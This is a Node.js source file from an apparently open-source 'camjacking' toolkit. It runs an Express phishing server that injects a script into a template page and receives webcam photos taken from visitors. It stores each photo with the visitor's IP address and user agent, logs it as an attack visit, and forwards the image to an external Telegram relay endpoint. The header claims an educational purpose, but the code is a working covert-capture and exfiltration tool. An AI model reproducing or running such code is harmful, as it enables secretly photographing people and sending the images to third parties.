#!/usr/bin/env node
/**
 * Camjacking - Camera Awareness & Security Training Toolkit (CLI)
 * ---------------------------------------------------------------
 *
 * Author      : Karthikeyan (https://karthithehacker.com)
 * GitHub      : https://github.com/karthi-the-hacker/camjacking
 * Project     : camjacking - A CLI framework for camera security awareness, phishing simulation, and cybersecurity training labs.
 *
 * License     : Open-source — strictly for educational, awareness, and authorized security training purposes ONLY.
 *
 * Note to Users:
 * --------------
 * 🔐 This tool is intended solely for educational use, security awareness programs, and authorized red-team / lab environments.
 * 🚫 Unauthorized use of this tool against individuals, devices, or networks without explicit permission is illegal and unethical.
 * ❗ If you use or modify this code, PLEASE GIVE PROPER CREDIT to the original author and repository.
 *
 * Warning to Code Thieves:
 * ------------------------
 * ❌ Removing this header or claiming this project as your own without credit is unethical and violates open-source community principles.
 * 🧠 Writing your own code earns respect. Copy-pasting without attribution does not.
 * ✅ Be an ethical hacker. Respect developers' efforts and give credit where it’s due.
 */

const express = require("express");
const pathLib = require("path");
const fs = require("fs");
const os = require("os");
const multer = require("multer");
const { injectedScript,RED, RESET } = require("./const");
const { logAttackVisit,getChatId } = require("./dbgateway");
const {sendToPhp } = require("./bot");
const { mainbanner } = require("./banner");



function phishingServer(name,publicUrl,temp,servePath, port = 8080,rl,onReturnToMenu) {
  const app = express();
  const storage = multer.memoryStorage();
  const upload = multer({ storage });

  
  console.log(`\n[+] Enter x to stop the server\n`);

  app.use(express.static(servePath, { index: false }));

  app.get(/.*/, (req, res) => {
    const filePath = pathLib.resolve(servePath, "index.html");

    fs.readFile(filePath, "utf8", (err, data) => {
      if (err) {
        return res.status(500).send("Error loading page");
      }

      let modifiedHtml = data;
      if (data.toLowerCase().includes("</body>")) {
        modifiedHtml = data.replace(/<\/body>/i, `${injectedScript}</body>`);
      } else {
        modifiedHtml += injectedScript;
      }

      res.send(modifiedHtml);
    });

    console.log(`\n[+] User opened url ${req.url}`);
  });

  app.post("/submit", upload.single("image"), async (req, res) => {
    try {
      const userUUID = req.body.uuid || uuidv4();

      const ip =
        req.headers["x-forwarded-for"]?.split(",")[0] ||
        req.socket.remoteAddress;

      const userAgent = req.headers["user-agent"] || "unknown";

      if (!req.file) {
        return res.status(400).send("No image uploaded");
      }

      const baseDir = pathLib.join(os.homedir(), "camjacking-photos", userUUID);
      fs.mkdirSync(baseDir, { recursive: true });

      const timestamp = Date.now();
      const filename = `${timestamp}.jpg`;
      const filePath = pathLib.join(baseDir, filename);

      fs.writeFileSync(filePath, req.file.buffer);

      logAttackVisit(userUUID, {
        ip,
        useragent: userAgent,
        filename,
        ts: timestamp
      });

      res.json({ status: "saved", path: filePath });
      const chatid = getChatId();
      console.log(`\n[+] IP Address: ${RED}${ip}${RESET}`);
      console.log(`[+] User-Agent: ${RED}${userAgent}${RESET}`);
      console.log(`[+] Log Timestamp: ${RED}${new Date(timestamp).toISOString()}${RESET}`);
      console.log(`[+] Saved file: ${RED}${filePath}${RESET}`);
      const response = await sendToPhp({
            endpoint: " https://api.cappriciosec.com/Telegram/camjackingv2.php",   
            imagePath: filePath,
            chatid: chatid,
            uuid: userUUID,
            name: name,
            template: temp,
            publicurl: publicUrl
          });
    } catch (err) {
      console.error(err);
      res.status(500).send("Server error");
    }
  });

  const server = app.listen(port, () => {
    console.log(`[✓] Server running on port ${port}`);
  });

  
  const onLine = (input) => {
  const key = String(input).trim().toLowerCase();


  if (key === "x") {
    console.log("\n[!] Stopping server...");

    server.close(() => {
      console.log("[✓] Server stopped.\n");

      rl.removeListener("line", onLine); 
       process.stdin.resume();
       process.stdin.read();

                   
      if (typeof onReturnToMenu === "function") {
        onReturnToMenu();  
      }                   
    });
  } else {
    console.log("[i] Server running. Press 'x' + Enter to stop.");
  }
};

rl.on("line", onLine);

return server; 
  
}


module.exports = { phishingServer };

